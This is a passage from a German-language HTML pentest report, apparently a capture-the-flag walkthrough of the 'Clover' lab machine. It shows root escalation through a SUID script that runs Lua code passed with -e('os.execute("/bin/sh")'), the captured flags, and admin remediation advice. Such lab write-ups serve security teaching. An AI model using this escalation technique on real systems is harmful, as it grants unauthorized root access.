+                  *   Shell-Zugriff als Benutzer `sword` (oder `asta`, die Logs sind hier widersprüchlich).
+                  *   Das Skript `deamon.sh` muss ausführbar sein und eine Schwachstelle enthalten oder mit erhöhten Rechten laufen.
+              </p>
+               <p class="recommendation"><strong>Risiko:</strong> Kritisch, wenn das Skript die Ausführung von Code mit Root-Rechten erlaubt.</p>
+
+             <p class="analysis"><strong>Schritt 1: Ausnutzungsversuch</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">sword@Clover:/usr/games/clover$</span> <span class="command">./deamon.sh -e 'os.execute("/bin/sh")'</span></div>
+                     <pre>
+<span class="prompt" style="color: yellow;">bash-4.3$</span> <span class="command">id</span>
+<span class="command">uid=1001(sword) gid=1001(sword) groups=1001(sword)</span>
+</pre>
+                     <div class="prompt" style="color: yellow;">sword@Clover:/usr/games/clover$</span> <span class="command">./deamon.sh -e 'os.execute("/bin/bash")'</span></div>
+                     <pre>[Wiederholung, gleiches Ergebnis]</pre>
+                      <div class="prompt" style="color: yellow;">asta@Clover:~$</span> <span class="command">./deamon.sh -e 'os.execute("/bin/bash")'</span></div> <span class="comment"><!-- Jetzt als asta? --></span>
+                     <pre>bash: ./deamon.sh: No such file or directory</pre> <span class="comment"><!-- Falsches Verzeichnis --></span>
+                       <div class="prompt" style="color: yellow;">asta@Clover:~$</span> <span class="command">su sword</span></div>
+                     <pre>Password: <span class="password">[Passwort eingegeben]</span>
+<span class="prompt" style="color: yellow;">sword@Clover:/home/asta$</span></pre> <span class="comment"><!-- Zurück zu sword --></span>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, das Skript `deamon.sh` auszuführen. Die Option `-e 'os.execute("/bin/sh")'` deutet darauf hin, dass das Skript möglicherweise ein Lua-Skript ist (`os.execute` ist eine Lua-Funktion zur Befehlsausführung) und die Option `-e` erlaubt das Übergeben von auszuführendem Code.
+                *   Erster Versuch als `sword`: Startet eine Shell, aber `id` zeigt weiterhin die Rechte von `sword`.
+                *   Zweiter Versuch als `asta` (aus `/home/asta`): Schlägt fehl, da das Skript nicht im aktuellen Verzeichnis ist.
+                *   Wechsel zurück zu `sword`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript ist als `sword` ausführbar und nimmt Lua-Code entgegen. Es scheint jedoch nicht direkt mit Root-Rechten zu laufen, wenn es normal ausgeführt wird.</p>
+
+            <p class="analysis"><strong>Schritt 2: Erfolgreiche Ausnutzung (SUID/SGID?)</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">sword@Clover:/usr/games/clover$</span> <span class="command">./deamon.sh -e 'os.execute("/bin/sh")'</span></div>
+                     <pre>
+<span class="prompt" style="color: red;">#</span> <span class="command">id</span>
+<span class="password">uid=1001(sword) gid=1001(sword) euid=0(root) groups=1001(sword)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Plötzlich führt derselbe Befehl, ausgeführt als `sword`, zu einer Shell, bei der die effektive Benutzer-ID (`euid`) auf `0` (root) gesetzt ist, obwohl die reale UID (`uid`) `1001` (sword) bleibt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Skript `deamon.sh` muss das SUID-Bit gesetzt haben und gehört dem Benutzer `root`. Wenn `sword` es ausführt, erbt der Prozess die Root-Rechte (`euid=0`). Die Lua-Code-Injection (`-e 'os.execute("/bin/sh")'`) ermöglicht das Starten einer Shell mit diesen effektiven Root-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Befehle als Root aus. Wechseln Sie zum Root-Verzeichnis und lesen Sie die Root-Flag.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie das SUID-Bit von `/usr/games/clover/deamon.sh` (`chmod -s /usr/games/clover/deamon.sh`). Überprüfen Sie den Zweck des Skripts und implementieren Sie es sicher, falls es benötigt wird. Überprüfen Sie alle SUID/SGID-Dateien regelmäßig.</p>
+
+            <p class="analysis"><strong>Schritt 3: Root-Flag lesen</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">#</span> <span class="command">cd /root</span></div>
+                     <div class="prompt" style="color: red;">#</span> <span class="command">ls</span></div>
+                     <pre>proof.txt</pre>
+                     <div class="prompt" style="color: red;">#</span> <span class="command">cat proof.txt</span></div>
+                     <pre>
+             ________________________________________________
+            /                                                \
+           |    _________________________________________     |
+           |   |                                         |    |
+           |   |  # whoami                               |    |
+           |   |  # root                                 |    |
+           |   |                                         |    |
+           |   |                                         |    |
+           |   |                                         |    |
+           |   |     Congratulations You PWN Clover!     |    |
+           |   |                                         |    |
+           |   |                                         |    |
+           |   |    <span class="password">974bd350558b912740f800a316c53afe</span>     |    | <span class="comment"><!-- Root Flag --></span>
+           |   |                                         |    |
+           |   |                                         |    |
+           |   |                                         |    |
+           |   |_________________________________________|    |
+           |                                                  |
+            \_________________________________________________/
+                   \___________________________________/
+                ___________________________________________
+             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
+          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
+       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
+    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
+ _-'.-.-.-.-.-. .---.-. .-------------------------. .-.---. .---.-.-.-.`-_
+:-------------------------------------------------------------------------:
+`---._.-------------------------------------------------------------._.---'
+
+// From 0xJin && 0xBush1do! If you root this, tag me on Twitter! @0xJin and @0xBush1do
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Aus der Root-Shell wird die Datei `/root/proof.txt` ausgelesen, die ASCII-Art und die Root-Flag enthält.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Root-Flag erfolgreich erfasst.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">User Flag (aus Log extrahiert)</div>
+                     <div class="flag-value"><span class="password">34f35ca9ea7febe859be7715b707d684</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/proof.txt</div>
+                     <div class="flag-value"><span class="password">974bd350558b912740f800a316c53afe</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 26. März 2021</p>
+    </footer>
+</body>
+</html>
